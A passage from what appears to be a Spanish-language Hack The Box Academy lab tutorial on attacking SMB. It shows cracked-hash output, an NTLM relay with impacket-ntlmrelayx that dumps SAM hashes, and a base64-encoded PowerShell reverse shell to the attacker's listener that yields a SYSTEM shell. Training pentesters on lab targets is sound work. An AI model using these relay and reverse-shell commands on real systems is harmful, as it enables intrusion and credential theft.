Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: compu -> kodiak1Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022

```

El hash NTLMV2 fue roto. La contraseña es`P@ssword`. Si no podemos descifrar el hash, potencialmente podemos transmitir el hash capturado a otra máquina usando[impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)o respondedor[Multirelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Veamos un ejemplo usando`impacket-ntlmrelayx`.

Primero, necesitamos establecer SMB para`OFF`en nuestro archivo de configuración de respondedores (`/etc/responder/Responder.conf`).

Atacando a SMB

```
xnoxos@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='SMB = Off

```

Entonces ejecutamos`impacket-ntlmrelayx`con la opción`--no-http-server`, `-smb2support`, y la máquina de destino con la opción`-t`. Por defecto,`impacket-ntlmrelayx`volcará la base de datos SAM, pero podemos ejecutar comandos agregando la opción`-c`.

Atacando a SMB

```
xnoxos@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

Podemos crear un shell inverso de PowerShell usando[https://www.revshells.com/](https://www.revshells.com/), Establezca nuestra dirección IP de la máquina, el puerto y la opción PowerShell #3 (Base64).

Atacando a SMB

```
xnoxos@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Una vez que la víctima se autentica a nuestro servidor, envenemos la respuesta y hacemos que ejecute nuestro comando para obtener un shell inverso.

Atacando a SMB

```
xnoxos@htb[/htb]$ nc -lvnp 9001listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX

```

### **RPC**

En el[Módulo de huella](https://academy.hackthebox.com/course/preview/footprinting), discutimos cómo enumerar una máquina usando RPC. Además de la enumeración, podemos usar RPC para hacer cambios en el sistema, como:

- Cambiar la contraseña de un usuario.
- Crear un nuevo usuario de dominio.
- Crea una nueva carpeta compartida.

También cubrimos la enumeración usando RPC en el[Módulo de enumeración y ataques de Active Directory](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

Tenga en cuenta que se requieren algunas configuraciones específicas para permitir este tipo de cambios a través de RPC. Podemos usar el[Página del hombre RPClient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)o[Acceso SMB desde la hoja de trucos de Linux](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)del Instituto Sans para explorar esto más a fondo.